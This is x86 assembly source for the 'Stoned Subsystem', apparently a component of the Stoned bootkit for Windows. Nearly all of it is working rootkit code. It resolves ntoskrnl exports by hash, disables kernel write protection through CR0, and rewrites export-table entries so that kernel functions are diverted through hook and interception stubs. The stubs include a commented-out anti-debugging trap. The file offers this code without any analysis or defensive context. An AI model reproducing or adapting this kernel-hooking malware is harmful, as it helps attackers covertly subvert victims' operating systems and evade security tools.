
; Stoned Subsystem to Windows


; ..using variables:
;   + 0   Ntoskrnl_BaseAddress
;   + 4   Callback_NotifyDriverLoad
;   + 8   Memory_Pool
;   + 12  Application and driver loading table



Stoned_Callback:

; executes calls in the Stoned Subsystem (= Service Call)

;   0   SbNotifyDriverLoad(void * Loading Callback)
;   1   SbKillOS()
;   2   SbInstallWindowsHook(hook * Function Hook)
;   3   SbGetData(int Identifier)

pushad

; temporary disable write-protect

; set pointer to the subsystem data
call Get_Current_EIP_1
Get_Current_EIP_1:                                                              ; [esp] contains now current eip (can be used as reference!)
sub [esp],dword Get_Current_EIP_1 - Subsystem_Variables                         ; seek to data (relative movement)
pop ebp                                                                         ; -> ebp is now data pointer (to the above data)

; check what function to invoke
cmp [esp + 4 +32],dword 0                                                       ; SbNotifyDriverLoad?
je SbNotifyDriverLoad
cmp [esp + 4 +32],dword 2                                                       ; SbInstallWindowsHook?
je SbInstallWindowsHook
cmp [esp + 4 +32],dword 3                                                       ; SbGetData?
je SbGetData

Stoned_Callback_Exit:
popad

ret 8





SbNotifyDriverLoad:

; SbNotifyDriverLoad(void * Loading Callback)

mov ebx,[esp + 8 +32]                                                           ; = param 1 (the function callback address)
mov [ebp + 4],ebx                                                               ; store to Callback_NotifyDriverLoad variable

jmp Stoned_Callback_Exit





SbInstallWindowsHook:

; SbInstallWindowsHook(hook * Function Hook)

; verify ntoskrnl hook (ebx holds hook structure)
mov ebx,[esp + 8 +32]                                                           ; accessing the "hook structure" (passed as second parameter on the stack)
mov eax,[ebx + 0]                                                               ; -> Hook.FunctionName = i.e. "ntoskrnl!ExAllocatePool";

; Hook.FunctionName = "ntoskrnl!.."?
or [eax],dword 20202020h                                                        ; mask out uppercase
cmp [eax],dword "ntos"
jne Stoned_Callback_Exit
or [eax+4],dword 20202020h                                                      ; mask out uppercase
cmp [eax+4],dword "krnl"
jne Stoned_Callback_Exit
cmp [eax+8],byte "!"
jne Stoned_Callback_Exit
add eax,9                                                                       ; skip the "ntoskrnl!" and move to the export name

; generate the hash (cheating again)
mov esi,eax                                                                     ; source is the function name
xor edi,edi                                                                     ; edi stores the calculated hash
cld

SbInstallWindowsHook_ToHash:
xor eax,eax
lodsb                                                                           ; inside a dll export, like "wctomb" (and others)
cmp al,ah                                                                       ; zero terminated string
jz SbInstallWindowsHook_ToHash_Finished
ror edi,13                                                                      ; according to Get_Dll_Function_Address
add edi,eax                                                                     ; something like a hash
jmp short SbInstallWindowsHook_ToHash

SbInstallWindowsHook_ToHash_Finished:                                           ; edi contains now the hash

; -> hash to export, now resolve the Export RVA (that is used for hooking)
push dword [ebp]                                                                ; store the ntoskrnl module address
push edi                                                                        ; store the function hash
call Get_Dll_Function_Address
mov eax,[esp-4-32-4-8]                                                          ; function Export RVA (stored by the function)

; when installing the hook system memory must be overwritten, thus the write-protect flag must be cleared
mov ecx,cr0
push ecx
and ecx,0FFFEFFFFh                                                              ; clear cr0.WP (bit 16)
mov cr0,ecx

; install the hook / interception
cmp [ebx + 8],dword 0                                                           ; 0 = HookType_Hook, 1 = HookType_Intercept
jne SbInstallWindowsInterception

call Install_Ntoskrnl_Export_Hook                                               ; hook
pop ecx                                                                         ; restore the cr0 register
mov cr0,ecx                                                                     ; and store it
jmp Stoned_Callback_Exit

SbInstallWindowsInterception:                                                   ; interception
call Install_Ntoskrnl_Export_Interception
pop ecx                                                                         ; restore the cr0 register
mov cr0,ecx                                                                     ; and store it
jmp Stoned_Callback_Exit




Install_Ntoskrnl_Export_Hook:

; eax = Export RVA
; ebx = hook structure

; 1. create a Function Forward Hook (allocate memory by the pool)
mov edi,[ebp + 8]                                                               ; aquire memory from the pool
add [ebp + 8],dword Function_Hook_End - Function_Hook                           ; and move function pointer forward
mov esi,ebp
add esi,Function_Hook - Subsystem_Variables                                     ; source = function hook stub
mov ecx,Function_Hook_End - Function_Hook                                       ; copy the whole stub
rep movsb

; 2. insert original calling address
mov ecx,eax                                                                     ; Function RVA address
mov ecx,[ecx]                                                                   ; Function RVA
add ecx,[ebp + 0]                                                               ; + ntoskrnl base address (= absolute function address)
sub edi,Function_Hook_End - Function_Hook_Insert_2 - 1                          ; move pointer to the address to insert (at the jmp instruction)
mov [edi],ecx                                                                   ; store original calling address

; 3. insert function forward
mov edx,[ebx + 4]                                                               ; function forward to call
sub edi,1 + Function_Hook_Insert_2 - Function_Hook_Insert_1 - 1                 ; move pointer to the address to insert (at the call instruction)
mov [edi],edx                                                                   ; store forward address

; 4. overwrite ntoskrnl export!
sub edi,1 + Function_Hook_Insert_1 - Function_Hook                              ; move pointer to beginning of hook stub
sub edi,ecx                                                                     ; difference between hook stub and original call
add [eax],dword edi                                                             ; apply the hook

; thanks people thats it!

ret




Install_Ntoskrnl_Export_Interception:

; eax = Export RVA
; ebx = hook structure

; 1. create a Function Forward Hook (allocate memory by the pool)
mov edi,[ebp + 8]                                                               ; aquire memory from the pool
add [ebp + 8],dword Function_Intercept_End - Function_Intercept                 ; and move function pointer forward
mov esi,ebp
add esi,Function_Intercept - Subsystem_Variables                                ; source = function hook stub
mov ecx,Function_Intercept_End - Function_Intercept                             ; copy the whole stub
rep movsb

; 2. insert original calling address
mov ecx,eax                                                                     ; Function RVA address
mov ecx,[ecx]                                                                   ; Function RVA
add ecx,[ebp + 0]                                                               ; + ntoskrnl base address (= absolute function address)
sub edi,Function_Intercept_End - Function_Intercept_Insert_1 - 1                ; move pointer to the address to insert (at the jmp instruction)
mov [edi],ecx                                                                   ; store original calling address

; 3. insert function forward
mov edx,[ebx + 4]                                                               ; function forward to call
add edi,Function_Intercept_Insert_1_2 + 1 - Function_Intercept_Insert_1 - 1     ; move pointer to the address to insert (at the call instruction)
mov [edi],edx                                                                   ; store forward address

; 4. overwrite ntoskrnl export!
sub edi,1 + Function_Intercept_Insert_1_2 - Function_Intercept                  ; move pointer to beginning of hook stub
sub edi,ecx                                                                     ; difference between hook stub and original call
add [eax],dword edi                                                             ; apply the hook

; thanks people thats it!

ret




; following code is fun code, no right on professionalism:


Function_Hook:

pushad
mov eax,esp
db  "KINGKLEISSNER"   ; :P

nop
nop
mov esp,eax
nop
nop
;int 2dh   ; xD    Anti-Kernel Debugging =D
popad

Function_Hook_Insert_1:
mov eax,0BAC14000h
call eax

call Minus1-1  ; :P
Minus1:
db  0C1h
nop
dec ecx
add esp,4

Function_Hook_Insert_2:
mov eax,19840000h + 'PK'
jmp eax                                                                         ; forward to original ntoskrnl function

Function_Hook_End:




Function_Intercept:

pushad
mov eax,esp
db  "KINGKLEISSNER"   ; :P

nop
nop
mov esp,eax
nop
nop
;int 2dh   ; xD    Anti-Kernel Debugging =D
popad

call Minus2-1  ; :P
Minus2:
db  0C1h
nop
nop
dec ecx

add [esp],dword Function_Intercept_Insert_2 - Minus2
pop eax
pop dword [eax+1]

sub eax,Function_Intercept_Insert_2 - Function_Intercept_Insert_1_1_2 - 1
mov [eax],esp

add eax,Function_Intercept_Insert_1_2 - Function_Intercept_Insert_1_1_2 - 4 - 1
sub esp,4
pop dword [eax] ; hehe


Function_Intercept_Insert_1:
mov eax,0BAC14000h
call eax                                                                        ; original function call

call Norm4l0
Norm4l0:
add [esp],dword Function_Intercept_Insert_1_2_3 - Norm4l0
pop edx
mov [edx + 1],eax
mov [edx + 1 + 4 + 1],esp

; invoke interception function
Function_Intercept_Insert_1_1_2:
mov esp,'XESP'

push eax
push dword 'CRAP'
Function_Intercept_Insert_1_2:
mov eax,'EISG';EK�HLTE SCHOKOLADE
call eax

Function_Intercept_Insert_1_2_3:
mov eax,'COOL';CHOCOLATE        mhmm
mov esp,'mov '; esp,'mov...

Function_Intercept_Insert_2:
mov edx,19840000h + 'PK'
jmp edx                                                                         ; return jump!

Function_Intercept_End:




SbGetData:

; SbGetData(int Identifier)
;     0 = Application and driver loading table

cmp [esp + 8 +32],dword 0                                                       ; Param1 = 0?
jne Stoned_Callback_Exit

lea eax,[ebp + 12]                                                              ; get a pointer to the loading table
mov [esp + 7*4],eax                                                             ; set return value (overwrite stored on by pushad)

jmp Stoned_Callback_Exit

